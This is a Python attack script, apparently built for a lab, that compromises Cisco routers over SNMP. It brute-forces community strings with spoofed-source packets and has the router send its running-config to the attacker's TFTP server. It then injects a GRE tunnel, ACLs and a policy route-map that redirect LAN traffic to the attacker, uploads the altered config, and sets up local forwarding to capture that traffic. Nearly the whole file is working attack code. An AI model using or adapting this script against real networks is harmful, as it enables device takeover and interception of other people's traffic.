#!/usr/bin/python3 
from os import system, environ, popen, kill
from os.path import realpath, dirname
environ['DISPLAY']=':0'
environ['PYTHONPATH']='./'
from pathlib import Path
from filecmp import cmp as file_cmp
from filecmp import clear_cache
from psutil import net_connections
from subprocess import *
from kamene.all import *
from requests import get
from signal import SIGTERM
from ptftplib.tftpserver import TFTPServer
import sys
import nmap
import threading



#   Check if host is up <- DONE
#   Check if host is listening on port  <- DONE
#   Scan port (tcp/udp) <-  DONE
#   Brute communities   <- DONE
#   Once found, snmpwalk and find configs
    #   Networks    <- DONE
        # once found... attempt config download

#   kill off old TFTP servers <- DONE
#   Start up TFTP server <- DONE
#   Verify <- DONE

#   Brute private communites + download config <- DONE

#   Parse config and find availible interfaces (mostly for de-duplication) <- DONE
#   Insert our Tunnel into bad config   <- DONE
#   Parse through availible networks & interfaces   <- DONE
#   Insert Create access-lists including our interesting traffic    <- DONE
#   Insert Create route map <- DONE
#   Insert Route map to interfaces  <- DONE

#   Send bad config down range <- DEBUG

#   Spin-up local tunnel interface  <- DONE
#   Spin-up local packet forwarding <- DONE
#   start sniffing traffic
#   filter for gre tagged traffic
clean = False
debug = 0
CONFIG="./running-config"
RHOST=None          # Global RHOST
RPORT=161           # Global RPORT
T_RHOST="10.0.0.2"  # Tunnel RHOST
T_LHOST="10.0.0.1"  # Tunnel LHOST
LHOST=(popen('ifconfig tap0 | grep -w "inet" | cut -d" " -f10').read()).strip()
for i,x in enumerate(sys.argv):
    if x.lower() in ["-r","--rhost"]:
        RHOST=sys.argv[i+1]
    elif x.lower() in ["-p","--rport"]:
        RPORT=int(sys.argv[i+1])
    elif x.lower() in ["-l","--lhost"]:
        LHOST=sys.argv[i+1]
    elif x.lower() in ["-c","--config"]:
        CONFIG=sys.argv[i+1]
    elif x.lower() in ["-d"]:
        debug = 1
    elif x.lower() in ["-dd"]:
        debug = 2
    elif x.lower() in ["--clean"]:
        clean = True

if RHOST is None:
    sys.stderr.write("[-] RHOST (-r / --rhost) is mandatory!\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using RHOST {RHOST} RPORT {RPORT}\n")

if LHOST == '':
    sys.stderr.write("[-] Tap0 not up.  Are you conencted to the lab\n")
    sys.exit(-1)
sys.stdout.write(f"[*] Using LHOST {LHOST}\n")


# ;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;; Cleanup ;;;;;;;
if clean:
    if debug > 0:
        sys.stdout.write("[D] Cleaning up old stuff...\n")
    os.system("rm ./running-config* 1>/dev/null 2>&1")
    os.system("rm ./snmpcommunities* 1>/dev/null 2>&1")
    os.system("modprobe -r ip_gre 1>/dev/null 2>&1")
    os.system("iptables -F")

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; INITIAL RECON ;;;;;;;;
# Host detection and service detection
nmap_args = f"-sU -p{RPORT}"
nm = nmap.PortScanner()
nm.scan(hosts=RHOST,arguments=nmap_args)

if nm[RHOST]['status']['state'] not in ['up']:
    sys.stderr.write(f"[-] Host {RHOST} is not up\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] {RHOST} appears up\n")

if nm[RHOST]['udp'][RPORT]['state'] not in ['open','open|filtered']:
    sys.stderr.write(f"[-] Port {RPORT} is not open on rhost {RHOST}\n\n")
    sys.exit(-1)
sys.stdout.write(f"[*] {RHOST}:{RPORT} appears open\n")
sys.stdout.flush()


# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;;;;; SNMP BRUTE ;;;;;;;;;;


# SNMP Community string brute
# Update the SNMP-communities list
list_file = './snmpcommunities.lst'
snmpcommunities = Path(list_file)
if not snmpcommunities.exists():
    sys.stdout.write("[*] Fetching a better list file than what nmap provides by default..\n")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/SNMP/snmp.txt"
    with open(list_file,"wb") as list_file_fd:
        response = get(url)
        list_file_fd.write(response.content)
    sys.stdout.write("[*] List file saved as: ./snmpcommunities.lst\n")
else:
    sys.stdout.write("[*] Looks like an snmpcommunities list is already present...\n")
sys.stdout.flush()

"""
# Brute for other public communities
sys.stdout.write("[*] Brute forcing SNMP communities\n")
nmap_args += f" --script=snmp-brute --script-args=snmp-brute.communitiesdb={list_file}"
nm.scan(hosts=RHOST,arguments=nmap_args)
result = nm[RHOST]['udp'][RPORT]['script']['snmp-brute'].strip('\n').split('\n')

communities = []
for k,v in enumerate(result):
    if " Valid credentials" in v.lstrip().split('-')[1]:
        communities.append(v.split('-')[0].rstrip().lstrip())

if len(communities) == 0:
    sys.stderr.write(f"[-] No communities discovered on host {RHOST}:{RPORT}!  \n")
    sys.exit(-1)
sys.stdout.write(f"[+] Found the following community strings: {communities}\n")
"""
# TESTING ONLY
communities = ['public']

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;;; GET NETWORK, SUBNET, INTERFACES ;;;;;;;;


# Getting interfaces and networks
# for use in ACLs

# EXAMPLE: ['FastEthernet0/0', '    IP address: 192.168.102.203  Netmask: 255.255.254.0',
sys.stdout.write("[*] Getting interfaces and networks...\n")
snmp_output = nm.scan(hosts=RHOST,arguments="-sU -p161 --script=snmp-interfaces")
snmp_output = nm[RHOST]['udp'][RPORT]['script']['snmp-interfaces'].lstrip().rstrip().split('\n')

# EXAMPLE:
#   ['FastEthernet0/0', 'IP address: 192.168.102.203  Netmask: 255.255.254.0'...
snmp_output2 = []
for i,x in enumerate(snmp_output):
    snmp_output2.append(x.rstrip().lstrip())

# EXAMPLE:
#{'FastEthernet1/0': ['IP', 'address:', '10.200.2.213', '', 'Netmask:', '255.255.255.0']}
snmp_output3 = {}
for i in range(0,len(snmp_output2)-1):
    if ("FastEthernet" in snmp_output2[i]) or ("GigabitEthernet" in snmp_output2[i]) or ("Ethernet" in snmp_output2[i]):
        if not LHOST or not RHOST in snmp_output2[i+1]:
            snmp_output3[snmp_output2[i]] = snmp_output2[i+1].split(' ')

if debug > 0:
    sys.stderr.write(   f"[D] SNMP_OUTPUT: {snmp_output}\n"\
                        f"[D] SNMP_OUTPUT2: {snmp_output2}\n"\
                        f"[D] SNMP_OUTPUT3: {snmp_output3}\n")
    sys.stderr.flush()

masks = {"255.255.255.255":"0.0.0.0","255.255.255.254":"0.0.0.1",
"255.255.255.252":"0.0.0.3","255.255.255.248":"0.0.0.7",
"255.255.255.240":"0.0.0.15","255.255.255.224":"0.0.0.31",
"255.255.255.192":"0.0.0.63","255.255.255.128":"0.0.0.127",
"255.255.255.0":"0.0.0.255","255.255.254.0":"0.0.1.255",
"255.255.252.0":"0.0.3.255","255.255.248.0":"0.0.7.255",
"255.255.240.0":"0.0.15.255","255.255.224.0":"0.0.31.255",
"255.255.192.0":"0.0.63.255","255.255.128.0":"0.0.127.255",
"255.255.0.0":"0.0.255.255","255.254.0.0":"0.1.255.255",
"255.252.0.0":"0.3.255.255","255.248.0.0":"0.7.255.255",
"255.240.0.0":"0.15.255.255","255.224.0.0":"0.31.255.255",
"255.192.0.0":"0.63.255.255","255.128.0.0":"0.127.255.255",
"255.0.0.0":"0.255.255.255","254.0.0.0":"1.255.255.255",
"252.0.0.0":"3.255.255.255","248.0.0.0":"7.255.255.255",
"240.0.0.0":"15.255.255.255","224.0.0.0":"31.255.255.255",
"192.0.0.0":"63.255.255.255","128.0.0.0":"127.255.255.255",
"0.0.0.0":"255.255.255.255"}

#{'10.200.2.213': '0.0.0.255'}
networks = {}
for k,v in enumerate(snmp_output3):
    pref = snmp_output3[v][2]
    wild = masks[snmp_output3[v][5]]
    sys.stdout.write(f"[*] Using the following network in the ACLs: {pref} {wild}\n")
    networks[snmp_output3[v][2]] = masks[snmp_output3[v][5]]
    if debug > 0:
        sys.stderr.write(   f"[D] PREF: {pref}\n"\
                            f"[D] WILD: {wild}\n"\
                            f"[D] NETWORKS: {networks}\n")

        sys.stderr.flush()

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; Spin-up TFTP server    ;;;;;;;;;; 
# ;;;;;; and check if listening  ;;;;;;;;;

sys.stdout.write(f"[*] Spinning up TFTP server on host {LHOST}:69\n")


iface = 'tap0'
root = './'
os.system(f"atftpd --daemon --bind-address {LHOST} --user root .")

res = ''
pid = ''
pids = []
for k,v in enumerate(net_connections()):
    if 69 == v[3][1]:
        pids.append(str(v[6]))

sys.stdout.write("[*] killing off previously existing TFTP servers\n")

for k,v in enumerate(pids):
    try:
        kill(int(v),SIGTERM)
    except ProcessLookupError:
        continue
    tftp_dir = os.path.dirname(os.path.realpath(sys.argv[0]))
    sys.stdout.write("[*] Now starting up our server...\n")
    os.system(f"atftpd --daemon --bind-address {LHOST} --logfile /var/log/atftpd.log --user root {tftp_dir}")

    for k,v in enumerate(net_connections()):
        if f"{LHOST}" == v[3][0]:
            if 69 == v[3][1]:
                res = v[3][0]
                pid = v[6]
    if len(res) == 0:
        sys.stderr.write(f"[-] Host not listening on {LHOST}:69!!!\n")
        sys.exit(-1)
    else:
        sys.stdout.write("[*] TFTP Server running\n")
        if debug > 0:
            sys.stdout.write(f"[D] Server info {res} PID={pid}\n")

    
# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; SNMP PRIVATE BRUTE AND ATTEMPT ;;;;;;;;;
# ;;;;;; DOWNLOAD REMOTE RUNNING-CONFIG ;;;;;;;;;
# Sort the internal addresses
spoof_addr = ''
for k,v in enumerate(networks):
    if v != RHOST:
        spoof_addr = v
        break

# Iterate through that .lst file, using the above address for the spoof
running_config = Path("./running-config")
i=IP(src=spoof_addr,dst=RHOST)
u=UDP(dport=161)
with open('./snmpcommunities.lst','r') as snmp_list:
    sys.stdout.write("[*] Brute forcing the private commuinty and attemping config download...\n")
    while not running_config.exists():
        for k,v in enumerate(snmp_list):
            private_community = v.strip()
            s=SNMP(community=private_community,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.55.{LHOST}"),value="running-config")]))
            send(i/u/s,count=1,verbose=0)
            sys.stdout.write(".")
                
            if running_config.exists():
                sys.stdout.write(f"\n[+] Private community found [{private_community}] : cisco running-config downloaded\n")
                break
        break

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;; CONFIG BUILD ;;;;;;;;;;;
# Build the new config entries from 
# downloaded config
src_eth = ""
tunnel_name = "interface Tunnel0\n"
tunnel_address = ""
tunnel_source = ""
tunnel_destination = ""

# Obtaining the interface associated with
# RHOST and setting it to tunnel_source
with open(CONFIG,"r") as fd:    
    for line in fd:
        int_eth = "interface FastEthernet"

        # String compare, looking for int_eth
        if int_eth in line[0:23]:

            # we're having to assume a reasonable number of interfaces
            # ... and that there are also only two (x/x) and not (x/x/x) 
            # ...  also keep in mind this is to prevent duplicates
            for i in range(0,11):
                for ii in range(0,11):
                    
                    # rebuild each "interface" name/number
                    src_eth = int_eth
                    src_eth += f"{i}/{ii}"
                    if src_eth in line[0:30]:
                        tmp_fd = fd
                        for tmp_line in tmp_fd:
                            if f" ip address {RHOST}" in tmp_line[0:28]:
                                tunnel_source = f" tunnel source {src_eth[10:]}\n"

# Same thing above, but Tunnel Interface
with open(CONFIG,"r") as fd:
    for line in fd:       
        int_tun = "interface Tunnel"
        if int_tun in line[0:17]:
            for i in range(1,2147483647):
                new_tun = int_tun
                new_tun += str(i)
                if new_tun in line[0:30]:
                    continue
                else:
                    # default
                    tunnel_name = f"{new_tun}\n"
tunnel_address = f" ip address {T_RHOST} 255.255.255.252\n"
tunnel_destination = f" tunnel destination {LHOST}\n"

# Similar style... take what exists and append +1...
# ...otherwise default to 1
acl_num = 0
new_acl = "access-list "
access_list = []
with open(CONFIG,"r") as fd:
    for line in fd: 
        acl = "access-list "
        if acl in line[0:12]:
            for acl_num in range(1,255):
                new_acl = acl
                new_acl += str(acl_num)
                if new_acl in line[0:16]:
                    continue
                else:
                    break
    for index,network in enumerate(networks):
        pref = network
        wild = networks[network]
        access_list.append(f"{new_acl} permit {pref} {wild}\n")

new_map = "route-map "
with open(CONFIG,"r") as fd:
    for line in fd:
        if new_map in line[0:10]:
            for i in range(0,5):
                new_map += str(i)
                if new_map not in line[0:15]:
                    new_map += "permit 10\n"
                    new_map += f" match ip address {acl_num}\n"
                    new_map += f" set ip next-hop {LHOST}\n"
                    break
            break
    new_map += f"{acl_num} permit 10\n"
    new_map += f" match ip address {acl_num}\n"
    new_map += f" set ip next-hop {LHOST}\n"


tunnel_config = ""
tunnel_config += tunnel_name
tunnel_config += tunnel_address
tunnel_config += tunnel_source
tunnel_config += tunnel_destination

sys.stdout.flush()
sys.stdout.write(   "[*] Using following tunnel configs\n"\
                    "----------------------------------\n"\
                    f"{tunnel_config}")


sys.stdout.flush()
sys.stdout.write(   "\n[*] Using the following ACLs\n"
                    "----------------------------\n")

sys.stdout.flush()
for k,v in enumerate(access_list):
    sys.stdout.write(f"{v}")


sys.stdout.flush()
sys.stdout.write(   "\n[*] Using the following route map\n"\
                    "---------------------------------\n"\
                    f"{new_map}\n")


# Drum up the new configuration file
# using our custom configs
old_cfg = ""
with open(CONFIG,"r") as fd:
    for line in fd:
        old_cfg += line
        if debug > 0:
            sys.stderr.flush()
            sys.stderr.write(f"[D][old_cfg] {line}")
# Get's LAN interfaces by  
# filtering interfaces with 
# RHOST or invalid addresses
lan_interfaces = []
for k,v in enumerate(snmp_output3):
    if snmp_output3[v][2] not in ["255.255.255.255",RHOST,T_RHOST,"255.255.255.254","127.0.0.1"]:
        lan_interfaces.append(v)

if debug > 0:
    sys.stderr.flush()
    sys.stderr.write(f"[D] LAN_INTERFACES: {lan_interfaces}\n")
# Iterate over the configs, index by index
new_cfg = ""
for k,v in enumerate(old_cfg.split('\n')):
    
    # Iterate over the lan_interfaces, index by index
    for i,x in enumerate(lan_interfaces):

        if debug > 0:
            sys.stderr.write(f"[D][new_cfg] {v} | X: {x}\n")
            sys.stderr.flush()
        # Should be a string comparison at this point
        # ... append the policy map to the interface
        # ... and then keep on adding rest of configs
        if v.strip() == f"interface {x}":
            new_cfg += f"interface {x}\n"
            new_cfg += f" ip policy route-map {acl_num}\n"
            continue
        elif "end" == v:
            new_cfg += tunnel_config
            new_cfg += "!\n"
            new_cfg += new_map
            new_cfg += "!\n"
            for i,x in enumerate(access_list):
                new_cfg += f"{x}"
            new_cfg += "!\n"
            new_cfg += "end\n"
        else:
            new_cfg += f"{v}\n"


if debug > 0:
    sys.stdout.flush()
    sys.stdout.write(   "\n\n--------------------------\n"\
                        "------New Configs---------\n"
                        "--------------------------\n\n")
    print(new_cfg)
else:
    sys.stdout.flush()
    sys.stdout.write(f"[*] New Configuration created!\n")


# Write to file and sanity check
os.rename("./running-config","./running-config.old")
with open("./running-config","w+") as fd:
        fd.write(new_cfg)

if debug > 0:
    with open("./running-config","r") as fd:
        for line in fd:
            sys.stdout.write(f"[D] {line}")
            sys.stdout.flush()

same = True
with open("./running-config","r") as fd_new, open("./running-config.old","r") as fd_old:
    for line_new,line_old in zip(fd_new,fd_old):
        if line_new != line_old:
            same = False
            break
                
if same:
    sys.stderr.write("[-] Both versions of running-config are the same... check file write.\n")
    sys.stderr.write("V new ------------------------new v\n")
    sys.stderr.write(new_cfg)
    sys.stderr.flush()
    sys.stderr.write("^ new ------------------------old v\n")
    sys.stderr.write(old_cfg)
    sys.stderr.flush()
    sys.stderr.write("^ old ------------------------old ^\n")
    

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;; Setup the local tunnel interface ;;;;;
sys.stdout.flush()
sys.stdout.write(   f"[*] Bringing up Tunnel interface\n"\
                    f"|-[>] modprobe ip_gre\n"\
                    f"|-[>] iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 255;\n"\
                    f"|-[>] ip addr add {T_LHOST}/30 dev mynet;\n"\
                    f"|-[>] ifconfig mynet up\n")

system( f"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE ;"\
        f"iptables --append FORWARD --in-interface mynet -j ACCEPT ;"\
        f"echo 1 > /proc/sys/net/ipv4/ip_forward ;"\
        f"modprobe ip_gre ;"\
        f"iptunnel add mynet mode gre remote {RHOST} local {LHOST} ttl 225 ;"\
        f"ip addr add {T_LHOST}/30 dev mynet ;"\
        f"ifconfig mynet up" )

# ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
# ;;;;;;;; BOMBS AWAY ;;;;;;;;;;;;
sys.stdout.write(f"[*] Uploading new configuration file..\n")

i=IP(src=spoof_addr,dst=RHOST)
u=UDP(dport=161)
s=SNMP(community=private_community,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"1.3.6.1.4.1.9.2.1.53.{LHOST}"),value="running-config")]))

for x in range(0,3):
    send(i/u/s,count=1,verbose=0)
    time.sleep(1)

# Verify connectivity to hosts
sys.stdout.write(f"[*] Testing for connectivity to tunnel endpoint...\n")
ctr = 0 
while(ctr <= 6):
    ret = srloop(IP(src=T_LHOST, dst=T_RHOST)/ICMP(),count=5)
    if ret[0].summary() == None:
        time.sleep(1)
        ctr += 1
    elif "echo-reply" in ret[0].summary():
        sys.stdout.write(f"[+] Tunnel endpoint {T_RHOST} is up\n")
        break
    elif ctr == 5:
        sys.stdout.write(f"[-] Cannot reach Tunnel endpoing {T_RHOST}. Check running-configs\n")
        sys.exit(-1)



